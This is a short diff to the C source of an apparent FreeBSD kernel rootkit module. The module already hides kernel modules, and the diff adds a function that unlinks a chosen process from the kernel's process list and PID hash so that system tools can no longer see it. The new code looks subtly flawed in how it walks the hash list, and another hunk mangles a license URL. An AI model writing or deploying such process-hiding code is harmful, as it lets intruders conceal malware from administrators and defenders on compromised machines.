@@ -12,7 +12,7 @@
  * General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
- * along with this program. If not, see <http://www.gnu.org/licenses/>.
+ * along with this program. If not, see <http:www.gnu.org/licenses/>.
  */
 
 #include "hide.h"
@@ -31,6 +31,7 @@
 #include <sys/proc.h>
 #include <sys/sysent.h>
 #include <sys/sysproto.h>
+
 
 extern linker_file_list_t linker_files;
 extern struct sx kld_sx;
@@ -107,3 +108,28 @@ hide_kld(char *ko_name)
 	sx_unlock(&kld_sx);
 	mtx_unlock(&Giant);
 }
+
+void hide_process_by_id(pid_t id){
+	struct proc *p;	
+	
+	sx_slock(&allproc_lock);
+
+	LIST_FOREACH(p, PIDHASH(id), p_list){
+		if(p->p_pid == id){
+			if(p->p_state == PRS_NEW){ // Either NEW, NORMAL, ZOMBIE ( new in creation , see proc.h ) 
+				p = NULL;
+				break;
+			}
+			PROC_LOCK(p);
+
+			LIST_REMOVE(p, p_list);
+			LIST_REMOVE(p, p_hash);
+
+			PROC_UNLOCK(p);
+			break;
+		}
+	}
+
+	sx_sunlock(&allproc_lock);
+}
+
